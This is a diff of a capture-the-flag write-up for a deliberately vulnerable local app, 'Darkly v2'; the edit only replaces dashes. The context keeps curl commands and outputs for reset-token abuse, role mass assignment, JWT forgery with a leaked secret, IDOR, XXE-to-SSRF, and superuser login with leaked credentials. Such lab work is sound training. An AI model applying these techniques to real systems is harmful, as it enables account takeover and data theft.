@@ -1,4 +1,4 @@
-# Darkly v2 — Step-by-step reproduction (with real outputs)
+# Darkly v2 - Step-by-step reproduction (with real outputs)
 
 Every flag, how it was discovered, the exact commands, and the **actual output** seen.
 Tokens/ids are per-run; the shapes match. Target: `http://localhost:4942` (app) and
@@ -30,7 +30,7 @@ Run it yourself: `./recon/recon.sh`.
 
 ---
 
-## Flag 1 — Predictable & disclosed password-reset token
+## Flag 1 - Predictable & disclosed password-reset token
 
 **Discovery:** the forum hints the reset is weak; the reset page posts to
 `/reset-password/request`. Requesting a reset **redirects with the token in the URL**
@@ -63,7 +63,7 @@ field, read via Flag 4: **`FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`**.
 
 ---
 
-## Flag 2 — Mass assignment (student → cadet)
+## Flag 2 - Mass assignment (student → cadet)
 
 **Discovery:** `/staff` says *"Cadet access required. Try PATCH /api/profile with the
 right fields."* `GET /api/profile` is 405 (only PATCH). PATCH echoes the full record and
@@ -87,11 +87,11 @@ $ curl -sS -b "session=$J" http://localhost:4942/staff/dashboard | grep -oE 'FLA
 FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
 ```
 
-Server rejects `staff`/`god` here ("role not assignable") — that step is Flag 3.
+Server rejects `staff`/`god` here ("role not assignable") - that step is Flag 3.
 
 ---
 
-## Flag 3 — Weak / leaked JWT secret (forge the god account)
+## Flag 3 - Weak / leaked JWT secret (forge the god account)
 
 **Discovery:** the session cookie is an HS256 JWT; the forum leaked the secret
 `42network`. A tampered signature or `alg:none` is **rejected** (so the secret is the
@@ -113,7 +113,7 @@ FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
 
 ---
 
-## Flag 4 — IDOR on `/api/users/<id>`
+## Flag 4 - IDOR on `/api/users/<id>`
 
 **Discovery:** `/api/users` lists every user (enumeration); `/api/users/<id>` returns
 any user's **full** record with no ownership check, over-exposing `private_note`,
@@ -141,7 +141,7 @@ unsalted md5 (jdoe's = `md5("abc123")`), so passwords crack instantly.
 
 ---
 
-## Flag 5 — XXE → SSRF → localhost-only config
+## Flag 5 - XXE → SSRF → localhost-only config
 
 **Discovery:** `/agenda/import` parses XML with entity resolution on (defusedxml
 disabled). `file://` entities return empty, but an **HTTP** external entity is fetched
@@ -162,15 +162,15 @@ $ curl -sS -b "session=$J" -F 'file=@xxe.xml;type=text/xml' http://localhost:494
 Flag: **`FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`**. This also leaks the **PocketBase
 superuser credentials** used in Flag 6. (Direct access without SSRF is blocked:
 `curl /internal/config` → `403 {"error":"forbidden"}`, and `X-Forwarded-For` spoofing
-does not help — QEMU NAT makes our requests appear as `10.0.2.2`, not loopback.)
+does not help - QEMU NAT makes our requests appear as `10.0.2.2`, not loopback.)
 
 ---
 
-## Flag 6 — PocketBase superuser (credential reuse)
+## Flag 6 - PocketBase superuser (credential reuse)
 
 **Discovery:** the config (Flag 5) leaked `admin@42network.local` / `Darkly42Admin!`.
 PocketBase runs internally on `:8090` (leaked by the `x-pocketbase` header; its admin UI
-`/_/` is disallowed in robots.txt — the flag name nods to that). Authenticate as
+`/_/` is disallowed in robots.txt - the flag name nods to that). Authenticate as
 superuser and read the audit collection.
 
 ```
@@ -180,7 +180,7 @@ token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
 
 $ T=$(curl -sS -X POST http://localhost:8090/api/admins/auth-with-password -H 'Content-Type: application/json' -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
 $ curl -sS http://localhost:8090/api/collections/internal_audit/records -H "Authorization: $T" | python3 -m json.tool | grep note
-            "note": "god-tier export OK — flag retained for the security audit: FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}",
+            "note": "god-tier export OK - flag retained for the security audit: FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}",
 ```
 
 Flag: **`FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`**. This is the application's true
